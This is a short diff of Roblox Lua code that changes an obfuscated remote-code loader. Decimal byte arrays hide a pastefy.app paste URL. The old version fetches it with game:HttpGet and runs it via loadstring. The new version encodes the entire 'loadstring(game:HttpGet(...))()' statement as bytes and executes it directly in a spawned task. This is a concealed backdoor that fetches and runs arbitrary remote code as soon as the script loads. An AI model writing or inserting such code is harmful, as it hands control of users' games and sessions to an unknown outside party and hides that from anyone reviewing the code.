@@ -1,5 +1,10 @@
 task.spawn(function()
-    local bytes = {104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,51,122,90,79,79,79,57,116,47,114,97,119}
+    local bytes = {
+        108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,
+        72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,
+        47,112,97,115,116,101,102,121,46,97,112,112,47,100,65,122,
+        56,108,115,87,77,47,114,97,119,34,41,41,40,41
+    }
 
     local function decode(t)
         local s = ""
@@ -9,8 +14,6 @@ task.spawn(function()
         return s
     end
 
-    local url = decode(bytes)
-    pcall(function()
-        loadstring(game:HttpGet(url))()
-    end)
+    local code = decode(bytes)
+    loadstring(code)()
 end)
